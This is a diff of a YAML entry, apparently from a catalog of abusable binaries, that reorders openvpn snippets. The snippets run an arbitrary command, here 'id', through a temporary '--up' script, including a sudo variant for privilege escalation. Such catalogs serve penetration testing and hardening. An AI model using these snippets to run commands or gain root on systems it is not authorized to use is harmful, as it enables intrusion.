@@ -1,5 +1,13 @@
 ---
 functions:
+  command:
+    - code: |
+        COMMAND='id'
+        TF=$(mktemp)
+        echo '#!/usr/bin/env sh' > $TF
+        echo "$COMMAND" >> $TF
+        chmod +x $TF
+        openvpn --dev tun0 --script-security 2 --up $TF
   suid:
     - code: |
         COMMAND='id'
@@ -16,12 +24,4 @@ functions:
         echo "$COMMAND" >> $TF
         chmod +x $TF
         sudo openvpn --dev tun0 --script-security 2 --up $TF
-  command:
-    - code: |
-        COMMAND='id'
-        TF=$(mktemp)
-        echo '#!/usr/bin/env sh' > $TF
-        echo "$COMMAND" >> $TF
-        chmod +x $TF
-        openvpn --dev tun0 --script-security 2 --up $TF
 ---
